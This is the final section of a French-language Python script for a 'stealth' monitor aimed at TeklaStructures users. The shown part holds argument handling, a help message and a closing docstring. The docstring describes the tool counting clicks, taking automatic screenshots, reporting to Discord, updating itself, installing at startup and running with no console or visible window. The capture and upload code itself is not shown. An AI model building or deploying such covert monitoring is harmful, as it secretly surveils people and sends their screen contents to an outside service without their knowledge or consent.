✅ Mise à jour automatique

**⚙️ Configuration actuelle:**
• Mode debug: {'✅ Activé' if Config.DEBUG_MODE else '❌ Désactivé'}
• Seuil productivité: {Config.MIN_CLICKS_PER_MINUTE} clics/minute
• Captures toutes les: {Config.SCREENSHOT_INTERVAL//60} minutes
• Vérification MàJ: {Config.UPDATE_CHECK_INTERVAL_HOURS}h

**📦 Commandes:**
`python monitor.py` - Démarrage
`python monitor.py --install` - Installation démarrage auto"""
        
        monitor.send_console(help_message)
    except:
        pass

if __name__ == "__main__":
    # Gestion des arguments de ligne de commande
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower()
        
        if arg == "--install":
            sys.exit(install_to_startup())
        elif arg == "--help":
            show_help()
            sys.exit(0)
        else:
            # Argument non reconnu - notification Discord seulement
            try:
                monitor = TeklaProductivityMonitor()
                monitor.send_console(f"❌ Argument inconnu: {sys.argv[1]}")
            except:
                pass
            sys.exit(1)
    
    # Démarrage normal - complètement silencieux
    sys.exit(main())

"""
================================================================================
                                    FIN DU CODE
================================================================================

SYSTÈME DE MONITORING STEALTH COMPLET

🎯 FONCTIONNALITÉS:
- Surveillance automatique TeklaStructures
- Comptage clics et analyse productivité  
- Captures d'écran automatiques
- Rapports Discord en temps réel
- Mise à jour automatique intégrée
- Mode 100% silencieux (aucune console)

🔧 CONFIGURATION:
Modifiez la classe Config pour personnaliser le comportement.

🚀 UTILISATION:
python monitor.py           # Démarrage silencieux
python monitor.py --install # Installation au démarrage auto
python monitor.py --help    # Aide envoyée sur Discord

⚡ MODE STEALTH:
- Aucun output console
- Aucune fenêtre visible
- Communication exclusivement via Discord
- Fonctionnement en arrière-plan complet

================================================================================
"""